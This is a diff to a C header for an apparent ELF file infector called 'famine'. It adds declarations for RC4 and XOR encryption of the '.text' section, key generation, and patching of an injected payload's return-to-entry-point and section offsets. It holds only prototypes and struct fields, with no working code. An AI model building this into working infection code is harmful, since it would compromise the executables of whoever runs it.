@@ -77,6 +77,8 @@ enum e_error
 };
 
 #define PAGE_SIZE 0x1000
+#define SECTION_TO_ENCRYPT_NAME ".text"
+#define KEY_LEN 0x80
 
 /* Custom types for 32bit compatibility. */
 #ifdef ARCH_32
@@ -133,6 +135,14 @@ typedef struct s_famine
     size_t text_p_size;
     t_elf_addr text_p_vaddr;
 
+    t_elf_off encrypt_s_start_offset;
+    t_elf_off encrypt_s_end_offset;
+    size_t encrypt_s_size;
+    t_elf_addr encrypt_s_addr;
+
+    void *cipher;
+    char *encryption_key;
+
     int ret2oep_offset;
 
     void *infected_file;
@@ -154,7 +164,16 @@ size_t find_ret2oep_offset_elf64(t_famine *famine);
 size_t find_getencryptedsectionaddr_offset_elf64(t_famine *famine);
 size_t find_getencryptedsectionsize_offset_elf64(t_famine *famine);
 
+void key_generator(t_famine *famine);
+void cipher_famine_file_data(t_famine *famine);
+char *rc4_cipher(t_famine *famine, char *data, int len);
+
 void overwrite_payload_ret2oep(t_famine *famine);
+void overwrite_payload_getencryptedsectionaddr(t_famine *famine);
+void overwrite_payload_getencryptedsectionsize(t_famine *famine);
+void overwrite_keysection_payload(t_famine *famine);
+void overwrite_payload_gettextsectionaddr(t_famine *famine);
+void overwrite_payload_gettextsize(t_famine *famine);
 void load_payload(t_famine *famine, char *payload_name);
 
 size_t find_gettextsize_offset_elf32(t_famine *famine);
@@ -175,6 +194,13 @@ void print_memory_hex(void *memory_ptr, size_t memory_size);
 void print_memory_char(void *memory_ptr, size_t memory_size);
 void free_famine(t_famine *famine);
 void error(int err, t_famine *famine);
+
+/****************************************************************************/
+/*                          ASM FUNCTIONS DEFINITIONS                       */
+/****************************************************************************/
+
+extern char *rc4_cipher_start(void *data, int datalen, char *key, int keylen);
+extern char *asm_xor_cipher(char *data, int datalen, char *key, int keylen);
 
 /****************************************************************************/
 /*                          GLOBAL VARIABLES                                */
